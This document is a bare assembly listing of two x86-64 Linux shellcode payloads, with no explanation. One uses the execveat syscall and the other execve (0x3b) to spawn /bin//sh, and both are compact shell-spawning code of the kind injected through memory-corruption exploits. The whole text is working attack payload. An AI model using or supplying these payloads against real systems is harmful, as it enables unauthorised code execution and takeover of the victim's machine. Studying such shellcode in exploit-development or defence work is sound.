push   0x42
pop    rax
inc    ah
cqo
push   rdx
movabs rdi, 0x68732f2f6e69622f
push   rdi
push   rsp
pop    rsi
mov    r8, rdx
mov    r10, rdx
syscall


xor rdx, rdx
push rdx
mov rax, 0x68732f2f6e69622f
push rax
mov rdi, rsp
push rdx
push rdi
mov rsi, rsp
xor rax, rax
mov al, 0x3b
syscall